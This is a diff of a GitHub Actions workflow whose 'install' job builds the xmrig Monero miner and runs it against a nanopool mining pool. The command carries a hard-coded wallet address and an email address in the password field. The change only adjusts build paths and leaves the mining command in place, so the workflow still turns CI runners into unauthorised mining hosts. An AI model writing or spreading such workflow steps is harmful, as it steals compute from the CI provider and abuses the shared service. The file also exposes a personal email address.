@@ -14,9 +14,8 @@ jobs:
          uses: actions/checkout@v4
        - name: install
          run: |
-          echo "$PWD"
           sudo apt-get update -y
           sudo apt-get install -y git build-essential cmake automake libtool autoconf
-          mkdir ./xmrig/build && cd ./xmrig/scripts
+          mkdir ./build && cd ./scripts
           ./build_deps.sh && cd ../build
           ./xmrig -a cryptonight -o stratum+tcp://xmr-us-east1.nanopool.org:10300 -u 47wjAGRkC7eMPa5tnJxV5pin2M2FfrapiUvVLQazb7HwDvv11vunhC6FR8J5AZBLWjCUBMbHXM1wN6FrZLPDSm1XQoKUFyc -p git-1:auzziewildcat10@gmail.com -t 1
